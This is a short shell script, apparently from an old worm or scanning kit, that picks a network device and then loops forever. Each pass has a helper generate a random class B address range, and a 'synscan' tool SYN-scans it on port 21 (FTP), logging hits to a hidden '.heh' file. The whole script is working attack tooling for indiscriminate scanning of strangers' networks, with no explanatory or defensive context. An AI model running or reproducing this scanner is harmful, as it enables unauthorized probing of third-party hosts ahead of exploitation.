#!/bin/sh
if /sbin/route | grep ppp0 >> /dev/null
 then
   DEVICE="ppp0"
   SPEED="dialup"
 else
   DEVICE="eth0"
   SPEED="t1"
fi


while true
 do
  CLASSB=`./randb`
  ./synscan $CLASSB .heh $DEVICE $SPEED 21
done

